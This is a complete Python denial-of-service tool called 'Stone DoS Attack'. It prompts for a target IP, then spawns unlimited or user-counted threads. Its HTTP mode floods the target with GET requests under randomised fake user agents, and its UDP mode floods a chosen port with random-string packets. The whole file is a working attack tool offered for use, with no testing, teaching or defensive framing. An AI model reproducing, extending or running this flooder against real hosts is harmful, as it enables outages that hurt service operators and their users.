#
#   Stone DoS Attack
#  [ Stolar Studio ]
#

ver = "0.1.4"

def error(text):
    print("\nERROR " + text)
    input("\nPress enter...")
    exit()

import threading
import requests
import os
import sys
import configparser
import socket
import string
import random

#threading.stack_size(64*1024)

from fake_useragent import UserAgent

if not os.path.exists("settings.txt"):
    config = configparser.ConfigParser()
    config.add_section("Settings")
    config.set("Settings", "infinity", "true")
    config.set("Settings", "UserAgent", "true")
    config.set("Settings", "Length-String", "10")

    config.add_section("Visual")
    config.set("Visual", "print-logo", "true")
    with open("settings.txt", "w") as config_file:
        config.write(config_file)
try:
    config = configparser.ConfigParser()
    config.read("settings.txt")
    infinity = config.get("Settings", "infinity")
    User_Agent = config.get("Settings", "UserAgent")
    LengthString = config.get("Settings", "Length-String")

    print_logo = config.get("Visual", "print-logo")
except:
    error("READ SETTINGS FILE")

infinity_bool = True if infinity == 'true' or infinity == 'True' else False
User_Agent_bool = True if User_Agent == 'true' or User_Agent == 'True' else False

print_logo_bool = True if print_logo == 'true' or print_logo == 'True' else False

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

if print_logo_bool:
    print("""
   _____ _                     _____        _____           _   _             _
  / ____| |                   |  __ \      / ____|     /\  | | | |           | |
 | (___ | |_ ___  _ __   ___  | |  | | ___| (___      /  \ | |_| |_ __ _  ___| | __
  \___ \| __/ _ \| '_ \ / _ \ | |  | |/ _ \\___  \    / /\ \| __| __/ _` |/ __| |/ /
  ____) | || (_) | | | |  __/ | |__| | (_) |___) |  / ____ \ |_| || (_| | (__|   <
 |_____/ \__\___/|_| |_|\___| |_____/ \___/_____/  /_/    \_\__|\__\__,_|\___|_|\_\
""")
else:
    print("Stone DoS Attack")
print("Ver : "+ver)
print('-' * 35)

if User_Agent_bool:
    ua = UserAgent()

#print(ua.random)
print("Select type attack")
print("1)REQUEST (HTTP)")
print("2)SOCKET")
type = input("type (num) = ")

try:
    if int(type) < 1 or int(type) > 2:
        error("TYPE")
except:
    error("TYPE")

print('-' * 35)

addr = input("IP : ")
if int(type) == 2:
    port = input("PORT : ")
    try:
        server = (addr, int(port))
    except:
        error("PORT")

    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.bind((get_ip(),0))
    s.setblocking(0)

print('-' * 35)

if not infinity_bool:
    count = input("Count Thread : ")
    print('-' * 35)



def randomString(stringLength=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def dos_req():
    while True:
        try:
            if User_Agent_bool:
                header = {'User-Agent':str(ua.random)}
                requests.get("http://"+addr, headers=header)
            else:
                requests.get("http://"+addr)
        except:
            pass

def dos_socket():
    while True:
        try:
            s.sendto(randomString(int(LengthString)).encode("utf-8"),server)
        except:
            pass

counts = 0

if infinity_bool:
    while True:
        try:
            if int(type) == 1:
                threading.Thread(target=dos_req).start()
            elif int(type) == 2:
                threading.Thread(target=dos_socket).start()
            counts += 1
            sys.stdout.write('\r')
            sys.stdout.write("PROCESS " + str(counts) + " STARTED")
            sys.stdout.flush()
        except:
            sys.stdout.write('\n')
            print("\nALL STARTED")
            break
else:
    for i in range(int(count)):
        if int(type) == 1:
            threading.Thread(target=dos_req).start()
        elif int(type) == 2:
            threading.Thread(target=dos_socket).start()
        sys.stdout.write('\r')
        sys.stdout.write("PROCESS " + str(i+1) + " STARTED")
        sys.stdout.flush()

    sys.stdout.write('\n')
    print("\nALL STARTED")
